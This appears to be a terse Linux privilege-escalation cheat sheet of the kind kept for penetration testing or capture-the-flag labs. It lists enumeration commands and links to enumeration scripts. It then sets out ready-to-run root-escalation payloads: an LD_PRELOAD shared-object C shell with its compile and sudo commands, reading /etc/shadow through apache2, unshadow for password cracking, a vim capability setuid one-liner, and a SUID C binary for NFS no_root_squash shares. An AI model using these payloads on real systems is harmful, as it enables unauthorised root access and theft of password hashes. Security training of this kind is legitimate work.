## ENUMERATION

hostname
uname -a
/proc/version
/etc/issue
ps -A -> view all running processes
ps axjf -> view process tree
env
sudo -l
id
cat /etc/passwd
history
ip route
netstat -au, netstat -at, netstat -l, netstat -tp
find / -writable -type d 2>/dev/null OR find / -perm -222 -type d 2>/dev/null OR find / -perm -o w -type d 2>/dev/null -> find world writable folders
find / -perm -o x -type d 2>/dev/null -> world executable folders
find / -perm -u=s -type f 2>/dev/null -> find SUID files
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## AUTOMATION SCRIPTS

LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Leverage application functions: apache2 -f /etc/shadow
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## LD_PRELOAD

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## CRACKING LINUX USER PASSWORD
unshadow passwd.txt shadow.txt > passwords.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## GET CAPABILITIES
getcap -r / 2>/dev/null //Example: -rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim
vim -> :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## NFS ("no_root_squash")
Create SUID file in remote share
FILE:
int main(){
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
